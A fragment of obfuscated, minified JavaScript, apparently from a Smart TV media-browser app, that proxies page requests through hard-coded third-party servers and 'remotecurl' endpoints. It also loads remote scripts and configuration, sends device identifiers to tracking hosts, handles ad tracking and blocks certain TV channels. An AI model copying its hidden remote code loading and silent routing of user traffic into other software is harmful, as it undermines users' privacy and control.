if(maJor.platform()=="android-device"&&maJor.build>=7){c.hasandroid=1;if(nd==-1)nd=c.method.length-1;c.method.splice((i+1),0,"android")}else c.method=arrDelValue(c.method,"android");c.select=-4;oInset.omni_hor=4;c.mobile=1;c.retry=0;if(ccount==null){lastUrl={};c.count=0}else c.count=ccount+1;c.hidden=0;c.postdata="";c.atime=15000;c.addheaders={};c.fulllink="";c.mwtn=0;c.canceled=0;c.xhr=null;c.xhr2=null;c.xhr4=null;c.waitcnum=1;c.waitc={"start":!1,"mode":null,"timer":null,"cmd":"","xml_url":"","lII1I1lOll0gr0IIOlYpr":"","sel":0,"orig_xml_url":"","data_parse":"","lO0OIQIeIb00OOI0lYpr":null}}catch(e){kjtYpr.popUp("uErr "+e.message)}
return c},setMaxTime:function(n){this.atime=n*1000;return this},addh:function(h){this.addheaders=h;return this},hid:function(){this.hidden=1;return this},is_remote:function(){if(maJor.params.get("remote")==0||!maJor.params.get("remoteactive"))return 0;else return 1},init:function(){if(this.request_id==null)this.request_id=kjtYpr.REQUEST_ID;if(this.mobile=1)this.ua=window.navigator.userAgent;else this.ua=ua_chrome},showbar:function(s){if(!this.hidden||s=="off")statusbar(s,"link")},abort:function(){var c=this;c.canceled=1;clearTimeout(c.fastremote_timer);if(c.xhr!=null)c.xhr.abort();if(c.xhr2!=null)c.xhr2.abort();if(c.xhr4!=null)c.xhr4.abort();if(!c.hidden)c.showbar("off")},sendrparse:function(data,s){var c=this;var uh=uHelper.create("directnoheader|rf|proxy",c.count);uh.parse=function(s){if(c.canceled){c.parse("Your aborted loaded page")}else c.parse(s)}
var u="";if(typeof data.async=="object"){if(gV(data.async,"post")!=""){u=data.async.post.replace("%s",encodeURIComponent(s))}}
if(u=="")u=sU(c.postlink||c.fulllink,"#POSTparse["+encodeURIComponent(data.parse)+"]="+encodeURIComponent(s));if(gV(data,"data")!="")u=sU(u,"#POST"+data.data);return uh.getI(u)},preparse:function(s){var c=this;if(c.canceled){return}
lastUrl[c.method[c.retry]+c.fulllink]=s;if(c.count>15){if(!c.hidden)statusbar("Error. Many redirect parse "+c.fulllink);c.abort()}else if(s!=null){if(s.indexOf('{"notify"')==0){kjtYpr.inf(l0OIIlIIlONuu1111Ypr(s)["notify"],2000);c.abort();return}else if(s.indexOf("{")==0&&(s.indexOf('{"parse":"')==0||s.indexOf('"async"')>0)){var data=l0OIIlIIlONuu1111Ypr(s);if(data&&data.parse){data.c=c;if(data.fastremote&&typeof data.async=="object"){if(gV(data.async,"send")!=""&&gV(data.async,"get")!=""){return c.fastremote(data)}}else if(gV(data,"cors")=="js"){$.ajax({url:data.parse,type:'GET',dataType:'jsonp',}).done(function(res){var s=ll1lI1lI0sl0OlIYpr(res)||res;c.sendrparse(data,s)});return c}else{if(gV(data,"cors")=="local"){c.xhr2=uHelper.create("directnoheader",c.count)}else if(gV(data,"cors").indexOf("|")>0){c.xhr2=uHelper.create(data.cors,c.count)}else if(maJor.app_cors)c.xhr2=uHelper.create("directnoheader|rf",c.count);else c.xhr2=uHelper.create("rf|xml",c.count);data.callback=c.xhr2.parse=function(s){if(c.canceled)c.parse(null);else if(typeof data.async=="object"&&0)c.preparse(s);else c.sendrparse(data,s)}
c.showbar(data.parse,"link");c.xhr2.get(data.parse,data);return c}}}}
c.parse(s)},parse:function(){},umwt:function(data){var c=this;if(c.canceled)return;c.xhr4=null;c.xhr4=new XMLHttpRequest();c.xhr4.onreadystatechange=function(){if(c.xhr4.readyState==4){if(c.xhr4.status==200&&c.xhr4.responseText!="wait"&&c.xhr4.responseText!=""){if(c.canceled)return;if(data.parsedata)data.parsedata.callback(c.xhr4.responseText);else c.sendrparse(data,c.xhr4.responseText)}else{c.mwtn++;if(c.mwtn<5)c.fastremote_timer=setTimeout(function(){if(!c.canceled)c.umwt(data)},4000);else{c.abort();if(!IlO11lQ0().is_ifr()){vPlayer.lIOQ0lI1iZm1hQ1O0Ypr(!0);if(!c.hidden)kjtYpr.popUp("Истекло время ожидания получения ссылки! Попробуйте позже или включите RemoteFork для более быстрой обработки ссылок",2500)}
c.parse()}}}};c.xhr4.open('GET',data.async.get,!0);c.xhr4.send()},fastremote:function(data){var c=this;var u=data.async.send;var d=u.match(/..*?(http.*?)("|$)/);if(d!=null)c.showbar(d[1],"fulllink");c.xhr2=null;c.xhr2=new XMLHttpRequest();c.xhr2.onreadystatechange=function(){if(c.xhr2.readyState==4){if(c.xhr2.responseText==""){if(!c.hidden)kjtYpr.popUp("Ошибка self парсинга! Включите RemoteFork для более быстрой обработки ссылок "+url+"!",2500);return c.parse("")}
if(c.canceled)return;if(c.xhr2.status==200){c.mwtn=0;fastremote_timer=setTimeout(function(){c.umwt(data)},4000)}else{c.xhr2=null;if(!c.hidden)kjtYpr.popUp("Истекло время ожидания получения ссылки! Включите RemoteFork для более быстрой обработки ссылок "+url+"!",2500)}}};c.xhr2.open('GET',u,!0);c.xhr2.send()},b64DecodeUnicode:function(str){try{str=str.replace(/\n/g,"");str=atob(str);return decodeURIComponent(str.split('').map(function(c){return'%'+('00'+c.charCodeAt(0).toString(16)).slice(-2)}).join(''))}catch(e){return str}},waitresponse:function(o){var c=this;if(c.canceled){return}
o.response=c.b64DecodeUnicode(gV(o,"response"));if(gV(o,"status")=="ok"){c.preparse(o.response)}else{c.preparse(o.response)}},waitcurl:function(url){var c=this;if(maJor.build>=7){waitc[c.request_id]=this;if(url.indexOf("curl")==0)var g=parseCURL(url);else g={"method":"GET","url":url,"header":{}};andr.parsecurl(ll1lI1lI0sl0OlIYpr(g),c.request_id)}else kjtYpr.inf("Update ForkNewBeta.apk for use request to "+url,1500);return c},getArand:function(r){var t=0,cur=0;for(var i in r)t+=r[i];rndWeight=Math.floor(Math.random()*t);for(var i in r){cur+=r[i];if(cur>=rndWeight)return i}},rCurl:{"":25,"2":40,"3":15,"4":15},getcu:function(u){return"http://exec"+gV(u)+".remotecurl.spiderxml.com/curl/command/?uri="},getDefCurl:function(){var c=this;if(document.location.href.indexOf("sub_server=")>0)maJor.params.set("serv",document.location.href.substr(document.location.href.indexOf("sub_server=")+11).split("#")[0]);if(gV(maJor.params.get("serv"))!=""){maJor.params.set("serv",parseInt(maJor.params.get("serv")));var x=0;for(var i in c.rCurl){if(x==maJor.params.get("serv"))return i;x++}}
return null},settime:function(s){var offset=new Date().getTimezoneOffset();if(gV(s).indexOf("=")!=-1){T.timestamp=Number(s.split("=")[1]);if(gV(s.split("="),2)!="")ipG=s.split("=")[2]}else T.timestamp=0;var timesec=T.timestamp*1000+offset*60000;if(!isNaN(timesec)&&timesec>16000000000){T.inetTime=Math.ceil(timesec)}else{T.inetTime=Date.now()+offset*60000}
clearInterval(kjtYpr.IntervalUpdateTime);kjtYpr.IntervalUpdateTime=setInterval('SetTimeDate();',1000)},llO0IOIkpzr0OOQ1OYpr:function(n){var c=this;n=gV(n);xhrl["p"+n]=uHelper.create("directnoheader");xhrl["p"+n].hidden=1;xhrl["p"+n].parse=function(s){if(!prload){c.settime(s);prload=1;rcurlUrl=c.getcu(n);c.updateDef();for(var i in c.rCurl){if(i!=n&&xhrl["p"+i]!=null)xhrl["p"+i].abort()}}}
xhrl["p"+n].get(c.getcu(n)+"ping")},updateDef:function(){var c=this;if(gV(cached,"start")==""){uHelper.create("directnoheader|rf|proxy").hid().get("http://komivp.github.io.spiderxml.com/index.js").parse=function(s){cached.start=s}}
if(!userGrid&&maJor.getId()){uHelper.create("directnoheader").hid().getI("http://cloudflare.appfxml.com/browseraccount/?do=grid").parse=function(s){if(!userGrid)var rel=1;else rel=0;userGrid=l0OIIlIIlONuu1111Ypr(gV(s));if(userGrid){if(l0O0l0111mJXG1OII1OYpr()&&handler=="menu"&&rel)IlO11lQ0().reload()}}}},updateCurl:function(){var c=this,tt=40;if(rcurlUrl==""){prload=0;var se=[];var tmp=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(c.rCurl));for(var i in c.rCurl){var n=c.getArand(tmp);se.push(n);delete tmp[n];setTimeout("if(!prload) uHelper.create('directnoheader').llO0IOIkpzr0OOQ1OYpr("+n+");",tt);tt+=1000}}else{c.xhr=uHelper.create("direct");c.xhr.hidden=1;c.xhr.parse=function(s){if(gV(s).indexOf("OK")==-1){rcurlUrl="";c.updateCurl()}else{c.updateDef()}}
c.xhr.get(rcurlUrl+"ping")}},curlUrl:function(){var c=this;if(rcurlUrl!="")return rcurlUrl;else{var u=c.getDefCurl();if(u==null)u=c.getArand(c.rCurl);return c.getcu(u)}},getI:function(u,parsedata){return this.get(maJor.addident(u),parsedata)},get:function(u,parsedata){var c=this;c.init();c.fulllink=u;if(u.indexOf("http://remotefo.rk/")==0){c.method=["android"]}
if(u.indexOf("usb://")==0){if(maJor.platform()=="tizen")TUsbList(u.substr(5),c);else if(maJor.platform()=="maple"){if(u=="usb://")ScanUsbPort(c);else getUsbList(u.substring(6),c)}else{kjtYpr.inf("Only for Tizen and Samsung maple api",1200);c.parse()}
return c}
var url=u;if(url.indexOf("#POST")>0){c.postdata=url.split("#POST")[1];url=url.split("#POST")[0]}
if(is_local(u)&&(c.method[c.retry]=="xml"||c.method[c.retry]=="proxy"||c.method[c.retry]=="remote")){c.retry++;if(c.retry<c.method.length)c.get(u,parsedata);else{if(!c.hidden)kjtYpr.inf("Error stream local parser",1200);c.abort();c.parse()}
return c}
if(gV(lastUrl,c.method[c.retry]+u+c.postdata)!=""){if(!c.hidden)statusbar("Error! Many redirects "+u);c.parse(gV(lastUrl,c.method[c.retry]+u));return c}else lastUrl[c.method[c.retry]+u]="1";c.showbar(url,"link");xhr_abort=!1;c.xhr=new XMLHttpRequest();c.xhr.onreadystatechange=function(){if(c.xhr.readyState==4){clearTimeout(c.l1IO1lzlVJI1Oll0Ypr);if(c.canceled)return;if(u.indexOf("/")==0)return c.preparse(c.xhr.responseText);else if(c.xhr.status!=200&&c.xhr.status!=302){if(c.method[c.retry].indexOf("direct")==0){if(c.xhr.status>0||(is_local(u)&&maJor.app_cors)){if(!c.hidden)kjtYpr.inf("Error "+c.xhr.status+" "+u,1200);return c.parse(null)}}
c.retry++;if(c.retry<c.method.length){return c.get(u,parsedata)}else{if(!c.hidden){is_loadpage(0);statusbar("Error stream parser network "+u)}
return c.parse(null)}}
c.preparse(c.xhr.responseText)}};if(u.indexOf("curl")==0)var lc=u;else lc='curl -L "'+url+'" -H "Accept-Language: ru,en;q=0.8,uk;q=0.6,bg;q=0.4" -H "User-Agent: '+c.ua+'" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"';c.hasheaders=0;for(var i in c.addheaders){c.hasheaders=1;lc+=' -H "'+i+': '+c.addheaders[i]+'"'}
if(c.postdata!==""){lc+=' -H "Content-Type: application/x-www-form-urlencoded" --data "'+c.postdata+'"'}
switch(c.method[c.retry]){case "rf":url="http://"+maJor.params.get("remoteip")+"/parserlink?"+encodeURIComponent(lc.replace(/\|/g,"-.-"));break;case "proxy":serv=["195.88.208.101","46.36.218.194","185.158.114.122"];var x=(window._?_.random(0,2):2);url="http://"+serv[x]+"/xhr.php?u="+encodeURIComponent(lc);c.postlink=url;break;case "xml":url=c.curlUrl()+encodeURIComponent(url);c.postlink=url;url+=maJor.addident();break;case "remote":var d={"async":{"send":prxremote+"?do=xhrremote2&u="+encodeURIComponent(url)+"&vp="+maJor.timestamp+"&time=7200&use_remote=|curl_androind|curl_windows|android-device|&use_country=&v=send&direct","get":prxremote+"?do=xhrremote2&v=wget&hash="+md5(url),"post":""}}
if(typeof parsedata=="object"){d.parsedata=parsedata;if(gV(parsedata.async,"post")!="")d.async.post=gV(parsedata.async,"post");if(gV(parsedata,"data")!="")d.data=gV(parsedata,"data")}
c.fastremote(d);return c;break;case "direct":if(c.hasheaders&&maJor.build>=7&&c.postdata=="")return c.waitcurl(lc);break;case "android":return c.waitcurl(lc);break}
if(c.method[c.retry].match(/rf|proxy|xml/)){c.xhr.open('GET',url,!0);c.xhr.send()}else if(u.indexOf("curl")==0){var curl=parseCURL(u);if(curl.method=="POST"){c.xhr.open('POST',curl.url,!0);if(c.method[c.retry]=="direct"){for(var p in curl.header)if(p!="Content-Type")c.xhr.setRequestHeader(p,curl.header[p]);}
c.xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded; charset=UTF-8');c.xhr.send(curl.body);}else{c.xhr.open("GET",curl.url,!0);if(c.method[c.retry]=="direct"){for(var p in curl.header)c.xhr.setRequestHeader(p,curl.header[p]);}
c.xhr.send()}}else if(c.postdata!==""){c.xhr.open('POST',url,!0);if(maJor.series!="D"&&maJor.series!="C"&&maJor.app_cors&&xhr_referer==3&&c.method[c.retry]!="directnoheader"){c.xhr.setRequestHeader("User-Agent",c.ua);c.xhr.setRequestHeader("Accept","*/*");c.xhr.setRequestHeader("Accept-Encoding","deflate")}
if(c.method[c.retry]=="direct"){for(var i in c.addheaders)c.xhr.setRequestHeader(i,c.addheaders[i]);}
c.xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');c.xhr.send(c.postdata);}else{c.xhr.open('GET',url,!0);if(maJor.series!="D"&&maJor.series!="C"&&maJor.app_cors&&xhr_referer==3&&c.method[c.retry]!="directnoheader"){c.xhr.setRequestHeader("User-Agent",c.ua);c.xhr.setRequestHeader("Accept","*/*");c.xhr.setRequestHeader("Accept-Encoding","deflate")}
if(c.method[c.retry]=="direct"){for(var i in c.addheaders)c.xhr.setRequestHeader(i,c.addheaders[i]);}
c.xhr.send()}
c.l1IO1lzlVJI1Oll0Ypr=setTimeout(function(){if(!c.canceled){xhr_abort=!0;c.xhr.abort();if(!c.hidden){kjtYpr.inf('_FPPrevLimOzh_',1500,'yellow')}}},c.atime);return c},list:[],recurFolder:function(a,ttl,desc){var ttl=gV(ttl);if(ttl!=="")ttl+=" ";for(var j in a){if(j=="title")ttl+=a[j]+" ";else if(j=="file"&&gV(a,"file")!==""){if(gV(a,"poster"))var dop='<img src="'+a.poster+'" style="width:180px;float:left;">';else dop="";if(gV(desc)!=="")dop+=desc+"<br>";this.list.push({"title":ttl,"logo_30x30":gV(a,"poster"),"stream_url":a[j],"description":dop+ttl})}else if(typeof a[j]=="object")this.recurFolder(a[j],ttl,desc)}}};uHelper.create('directnoheader').updateCurl();setInterval("uHelper.create('directnoheader').updateCurl();",1800000);function getSelect(){if(typeof IlO11lQ0()!="undefined")return parseInt(IlO11lQ0().select);else return 0}
function setSelect(s){if(s=="--")IlO11lQ0().select--;else if(s=="++")IlO11lQ0().select++;else IlO11lQ0().select=parseInt(s);return!0}
function curCh(m,v){return IlO11lQ0().curCh(m,v)}
function copyToClipboard(elem){var targetId="_hiddenCopyText_";var isInput=elem.tagName==="INPUT"||elem.tagName==="TEXTAREA";var origSelectionStart,origSelectionEnd;if(isInput){target=elem;origSelectionStart=elem.selectionStart;origSelectionEnd=elem.selectionEnd}else{target=document.getElementById(targetId);if(!target){var target=document.createElement("textarea");target.style.position="absolute";target.style.left="-9999px";target.style.top="0";target.id=targetId;document.body.appendChild(target)}
target.textContent=elem.textContent}
var currentFocus=document.activeElement;target.focus();target.setSelectionRange(0,target.value.length);var succeed;try{succeed=document.execCommand("copy")}catch(e){succeed=!1}
if(currentFocus&&typeof currentFocus.focus==="function"){currentFocus.focus()}
if(isInput){elem.setSelectionRange(origSelectionStart,origSelectionEnd)}else{target.textContent=""}
return succeed}
function exinobj(obj,k){var res=0;$.each(obj,function(ii,val){if(k==val)res=1});return res}
var wdtimer=null,video=null,lIOl1101IHglt010lYpr=0,dns_url='',old_select=0,old_p=0,lll00IOztuNlOOI0Ypr="",select=0,count=0,pstream=!1,Password="",avideo="",margin=0,lIllO0Imlel1IlI1Ypr="",handler="menu",prev={},version="",inftimer=null,sQual=[1080,720,480,360,240];var lOIOOIIIOp0uOlOOI0Ypr="",llO0IOIkpzr0OOQ1OYprtimer=null,sNext=["","_FPPosledovatelno_","_FPPovtoryat_ _FPodin_","_FPPovtoryat_ _FPvse_","_FPOtkl_"];var fons=[];var f_font="LG Display|Calibri|Arial|Times New Roman|Courier New|Georgia|Trebuchet MS".split("|");var FileObj={},startX=9,minimize=!1,oldselect=0;var is_iptv=0,title_pad=0;var lOI0lOlbQIllOYpr="obovse.ru",info_mode=0,ordered=null,plmini_canplay=!0,nv_reload=!0,remote_version=0;var tscreen="main",tgame="",payd={};var chGroup=[],chGroupSel=0,cmdReload=!1,spider_stat="";var aborted=!1,templic=0;var baseurl={};var rek_num=0,rek_played=0,country="",apijsUrl="",apijsSend=0,whitestripes=0,device_id="",device_token="",client_id="";var supportWebOS=!1,seSt=[],stSend=null;var lOO1IIlwlIl0l1lYpr=[],enteresObj=[];ll010Apn00lIlYpr=37;l11I1l0IIIKHOO01lYpr=4;ch_size=29;if(typeof ttmac=="undefined")var ttmac=!1;var tmac=";lg3166589601;lg1539962599;309c23abaf66;641cb0dc4145;b8347510748e;pc1539962447;f46d04148b88;001a791e43d4;84119e2bd1bc;9e411ecc394acbbe;ph1539962159;525400123456";lQ01I0tvHtlI01OIYpr=29;var sidB=0,sidW=35;tpadding=1,rek_last=0,rek_q=0,rek_n=0;rek_interval=2*3600*1000;var backtimer;var selIconstart=!1,server_load,vr=0,fonLen;var oID="",yfirst=!0,allTimes={},userGrid=null;countries=["Другие","Украина","Россия","Казахстан","Беларусь"];var psize=0;var l1Q0011lOE10u1OQ1O1Yprmode=0,l1Q0011lOE10u1OQ1O1Yprx=1;var iframeExit=0,fullBody=!1,numBack=0,numBack2=-1,screensavertimer=-1,isScreensaver=!1;var indload=0,supportStorage=!0;var blocked_ch=",НТВ,ТНТ,Звезда,Рен ТВ,Россия,Петербург5 канал,Russia Today,Life News,Первый канал,ТВ Центр International,РТР Планета,НТВ Мир,Россия 24,РБК ТВ,История,365 дней,24 Техно,МИР 24,Страна,КХЛ,Сарафан,Совершенно секретно,Время,Музыка Первого,Ocean-TV,Телевизионный дамский клуб,24 Док,STV,Индия ТВ,Здоровое ТВ,Ля-Минор,Drive,Russian Travel Guide,Ретро,Вопросы и ответы,Footschool TV,Психология21,Mini Movie,Православная телекомпания,Look TV,Amazing Life,Ностальгия,Радость моя,ТБН,";var blocked_epg=",rt-doc,rt-doc-rus,rti,lifenews,rtr,vesti,ort,zvezda,zvezda2,zvezda3,zvezda4,zvezda7,tv3,tv3_2,tv3_3,tv3_4,"+"tv3_7,rossiya+2,rossiya+2,rossiya+2,rossiya+4,rossiya+6,"+"rossiya+8,rossiya-hd,rossiya,rentv,rentv2,rentv4,rentv7,ntv,ntv2,ntv3,ntv4,ntv7,ntv-bel,kultura,kultura+2,kultura+4,kultura+7,"+"ort,ort+2,ort+4,ort+6,ort+8,ortint,ort-hd,planeta-ukr,planeta-sng,karusel,karusel+3,karusel+7,"
if(typeof curWidget!="object"){curWidget={}}
if(window.top!==window.window){}
function l1OO1III0XvIvOlII1lYpr(u){var script=document.createElement('script');script.type='text/javascript';script.async=!0;script.src=u;script.onload=function(){};document.getElementsByTagName('head')[0].appendChild(script)}
function l10IQlI0RgI0IIOYpr(){var xhr=null;xhr=new XMLHttpRequest();xhr.onreadystatechange=function(){if(xhr.readyState==4){if(xhr.responseText.indexOf("ok")==-1){setTimeout("l10IQlI0RgI0IIOYpr();",5000)}else{}}};url='http://online.lnka.ru/online.php';xhr.open('GET',url,!0);xhr.send()};var rek_url="rek_on",rek_type="",rek_proto=0;var Point={};function lO1l0Ql0lpNwI01OOYpr(url,file_url,type,recurs){if(rek_type=="youtube"||rek_type=="youtube2"||rek_type=="advert")return lO1l0Ql0lpNwI01OOYpr_y(url,file_url,type);if(ttmac){kjtYpr.popUp("rek num="+rek_num+"<br>"+curTime+"/"+totalTime+"<br>"+type+"<br>"+url,300)}
if(type=="start"&&url){uHelper.create("directnoheader").hid().get(url).parse=function(s){if(is_rek&&s){var s=s.replace(/\n/g,"").replace(/\r/g,"");if(s.indexOf("MediaFiles")>0||s.indexOf("VASTAdTagURI")>0){if(s.indexOf("VASTAdTagURI")>0){s=s.replace(/\[CACHEBUSTING\]/g,_.random(10000000,99999999));s=s.replace(/%7BENCODED_REF_URL%7D/g,encodeURIComponent(document.referrer));regexp=new RegExp("VASTAdTagURI.{1,70}(http.*?)\]","ig");if((items=regexp.exec(s))!=null){lO1l0Ql0lpNwI01OOYpr(items[1],'','start',!0)}}else{regexp=new RegExp("<MediaFile.*?video.*?((http|//).*?)\]","ig");if((items=regexp.exec(s))!=null){if(items[2]=="//")rek_url="http:"+items[1];else rek_url=items[1]}else{regexp=new RegExp("<MediaFile.*?type=.image\/.*?>(.*?)<\/MediaFile>","i");if((items=regexp.exec(s))!=null){rek_url=items[1].replace("<![CDATA[","").replace("]]>","");if(rek_url.indexOf("//")==0)rek_url="http:"+rek_url;rek_url="image/"+rek_url}}}
regexp=new RegExp("<Impression.*?>(.*?)<\/Impression","ig");if(recurs==null)Point["impression"]=null;while((items=regexp.exec(s))!=null){it=totrim(items[1].replace("<![CDATA[","").replace("]]>",""));if(it.indexOf("//")==0)it="http:"+it;if(Point["impression"]==null)Point["impression"]=it;else if(Point["impression"])Point["impression"].push(it);else{var tmp=Point["impression"];Point["impression"]=[];Point["impression"].push(tmp);Point["impression"].push(it)}}
var event=["start","midpoint","firstQuartile","thirdQuartile","complete","close","skip"];for(var i=0;i<event.length;i++){if(recurs==null)Point[event[i]]=null;regexp=new RegExp("<Tracking[^>]*?event=\""+event[i]+"\".*?>(.*?)<\/Tracking","ig");while((items=regexp.exec(s))!=null){it=totrim(items[1].replace("<![CDATA[","").replace("]]>",""));if(it.indexOf("//")==0)it="http:"+it;if(Point[event[i]]==null)Point[event[i]]=it;else if(typeof Point[event[i]]=="object")Point[event[i]].push(it);else{var tmp=Point[event[i]];Point[event[i]]=[];Point[event[i]].push(tmp);Point[event[i]].push(it)}}
if(Point[event[i]]==null){if(rek_type=="citrus"||rek_type=="proto"||rek_type=="user"){}else if(event[i]!="close"&&event[i]!="skip"){if(rek_num==0){rek_url="rek_on";rek_num++}else{rek_url="";rek_num++}
rek_url="";rek_num++;handler="menu";vPlayer.err_rek();break}}}
Point["linkTxt"]="";var mtc=s.match(/<Extension type=.linkTxt..*?>(.*?)<\/Extension>/);if(mtc!=null)Point["linkTxt"]=mtc[1].replace("<![CDATA[","").replace("]]>","");Point["skipTime"]=-1;var mtc=s.match(/<Extension.*?skipTime.*?00:00:(.*?)\]/);if(mtc!=null){Point["skipTime"]=parseInt(mtc[1])}else{var mtc=s.match(/skipoffset="00:00:(.*?)"/);if(mtc!=null){Point["skipTime"]=parseInt(mtc[1])}else{var mtc=s.match(/<Extension.*?skipTime.*?00:(.*?)\]/);if(mtc!=null){Point["skipTime"]=parseInt(mtc[1])}}}
Point["Duration"]="";var mtc=s.match(/<Duration>(.*?)<\/Duration>/);if(mtc!=null){var Dtime=mtc[1].replace("<![CDATA[","").replace("]]>","").split(":");var el=parseInt(Dtime[Dtime.length-1]);if(!isNaN(el))
Point["Duration"]=el;el=parseInt(Dtime[Dtime.length-2]);if(!isNaN(el))
Point["Duration"]+=el*60;el=parseInt(Dtime[Dtime.length-3]);if(!isNaN(el))
Point["Duration"]+=el*3600}
Point["ClickThrough"]="";var mtc=s.match(/<ClickThrough>(.*?)<\/ClickThrough>/);if(mtc!=null){Point["ClickThrough"]=mtc[1].replace("<![CDATA[","").replace("]]>","")}
Point["dstUrl"]="";var mtc=s.match(/dstUrl\".*?(.{1,100})\]/);if(mtc!=null){Point["dstUrl"]=mtc[1]}
if(Point["skipTime"]>5||Point["skipTime"]<0)Point["skipTime"]=5;if(s.indexOf("VASTAdTagURI")==-1){playVast(rek_url);return}}
if(s.indexOf("VASTAdTagURI")>0){}else if(rek_url==""||rek_url=="rek_on"){if(++rek_n>0){is_adult=!1;rek_url="";setTimeout("is_adult=true;rek_n=0;",45000)}
vPlayer.err_rek()}else{playVast(rek_url)}}else{vPlayer.err_rek("errrek  ")}}}
if(file_url=="half"||file_url=="skip"){if(file_url=="skip"){is_adult=!1;if(Point["start"]){if(Point["impression"]){lO1l0Ql0lpNwI01OOYpr(Point["impression"],"half")}
lO1l0Ql0lpNwI01OOYpr(Point["start"],"half");if(Point["dstUrl"]){lO1l0Ql0lpNwI01OOYpr(Point["dstUrl"],"half")}
Point["start"]=null}
if(!Point["skip"]&&Point["complete"])lO1l0Ql0lpNwI01OOYpr(Point["complete"],"half")}
if(url){if(typeof url=="object"){for(var i=0;i<url.length;i++){var myImage=new Image(1,1);myImage.src=url[i]}}else{var myImage=new Image(1,1);myImage.src=url}}
if(file_url=="skip"){uHelper.create("directnoheader").hid().get("http://browser.appfxml.com/gstatic.php?do=rek&cid=skip&appid="+rek_type+maJor.platform()+"&hardware="+kjtYpr.hardware+"&vr="+vr+"&box_server="+nServer+"&box_low="+maJor.box_low+"&title="+curCh("title"));rek_url="";if(maJor.platform()=="android-device")vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();else easystop();setTimeout("IlO11lQ0().play(null,rek_mode);",500)}
return}};var kjtYpr={PresearChSelected:-1,Password:"",Password2:"",no_save:!1,lQIO1I0lWwC01OOlIYpr:"",timeout:15,channels:[],menu:[],global:{},build:0,sdk:0,"lII1I1PVBuI1lIlYpr":"","extmode":!1,"muted":!1,"rlogo":!0,"Exittrue":0,"inputId":"","hm":"","virtual":0,"applyenter":1,"REQUEST_XML":"","REQUEST_ID":0,"SUBREQUEST_ID":0,"IFRAMES":[],"IFRAME_BACK":0,"lastSearch":"","defaulted":0,"mac":undefined};kjtYpr.setDefault=function(m){maJor.GL=maJor.ds();maJor.params.save();if(m)return;maJor.write("glsearch","")};var show_cc=!0,arr_nv=[],is_readst=!1;function readSt(getlist){is_readst=!0;var ch=[];try{ch=l0OIIlIIlONuu1111Ypr(cached.start)["channels"]}catch(e){kjtYpr.popUp("Error get defines list from https://raw.githubusercontent.com/komivp/appinfodl/main/index.js");ch=[]}
if(ch==null)ch=[];ch.unshift({"source":"spider","title":"_FPConfiguring search_","tvg-shift":"98","logo_30x30":_img("_ST_settings.png"),"playlist_url":"cmdSetSearch","description":"cmdSetSearch"});ch.unshift({"source":"spider","title":"_FPIstoriya_","tvg-shift":"98","logo_30x30":_img("_ST_history.png"),"playlist_url":"cmdHistory","description":"cmdHistory"});ch.unshift({"source":"spider","title":"_FPTop queries_","tvg-shift":"98","logo_30x30":"_ST_search.png","playlist_url":"http://spiderxml.com/topsearch"});ch.unshift({"source":"spider","title":"_FPEnter search query or site URL, playlist XML / M3U_ <img width='"+css_w(22)+"' src='"+_img("_ST_search.png")+"' style='float:right;height:"+css_wh(22)+"px;padding-top:3px;'>","tvg-shift":"99","value":"","search_on":"_FPEnter search query or URL_:","logo_30x30":_img("_ST_search.png"),"playlist_url":"searchEngines","description":"search engine","presearch":"http://omnibox.spiderxml.com/?type=all"});if(maJor.build>=5.5){ch.push({"source":"service","title":"Local Files & Plugins","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"http://remotefo.rk/treeview?host=remotefo.rk/","description":"http://127.0.0.1/treeview"})}else if(maJor.build>=5.1){ch.push({"source":"service","title":"Ace stream torrent plugins","logo_30x30":"_ST_ace_stream.png","playlist_url":"http://remotefo.rk/treeview?pluginacetorrentplay/.xml&host=remotefo.rk/","description":"forkplayer://pluginacetorrentplay/"})}
if(maJor.params.get("remote")>0||maJor.params.get("acestream")!="")ch.push({"source":"service","title":"Torrent сайты","logo_30x30":"_ST_ace_stream.png","local":2,"mb_parser":"http://ACE_IP:6878/webui/api/service?method=get_version&format=jsonp&callback=mycallback","menu_url":"1080|remotefork|rfs","playlist_url":"http://p.lnka.ru/torrentsites/?as=md5mbhash","description":"http://p.lnka.ru/torrentsites/"});if(maJor.params.get("remote")>0){ch.push({"source":"service","title":"RemoteFork DLNA & Plugins","logo_30x30":"_ST_dlna.png","playlist_url":"forkdlna","description":"forkplayer://RemoteFork/"});ch.push({"source":"service","title":"Home media server","tvg-shift":"1","logo_30x30":"_ST_hms.png","playlist_url":"hms","description":"forkplayer://HMS/"})}
if(maJor.platform()=="tizen"){if(version_local_files>0)ch.push({"source":"service","title":"USB","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"})}else if(maJor.platform()=="maple"){ch.push({"source":"service","title":"USB<br>_FPPamyatTv_","tvg-shift":"1","logo_30x30":"_ST_usb.png","playlist_url":"usb://","description":"forkplayer://USB/"});ch.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php","description":"http://forkplayer.tv/forkstore"})}else if(maJor.platform()=="tizen")ch.push({"source":"service","title":"ForkStore<br> App Market","tvg-shift":"1","logo_30x30":"_ST_fstore.png","playlist_url":"http://obovse.ru/smarttv/wlist.php?id=apps","description":"http://forkplayer.tv/forkstore"});if(getlist)return ch;for(var z=0;z<ch.length;z++){try{baseurl[ch[z].playlist_url]=ch[z].description}catch(e){}}
return ch;is_readst=!0}
var homeurl=document.location.href;if(homeurl.indexOf("#")!=-1)homeurl=homeurl.substr(0,homeurl.indexOf("#"));if(homeurl.indexOf("?")!=-1)var fshomeurl=homeurl.substr(0,homeurl.indexOf("?"));else fshomeurl=homeurl;var boot=!0;function onElementFocused(e){if(document.activeElement!=document.body)setTimeout("document.activeElement.blur();",50)}
var gnxu="";var uWt;function updateWeather(){clearTimeout(uWt);uWt=setTimeout("updateWeather();",2000000);if(maJor.params.get("weather")==-1){$_("weather").style.display="none";return}
uHelper.create("directnoheader").hid().getI("http://cloudflare.appfxml.com/browseraccount/?do=weather&box_low2="+maJor.box_low+"&id="+maJor.params.get("weather")).parse=function(s){$_("weather").style.display="block";$_("weather",s)}}
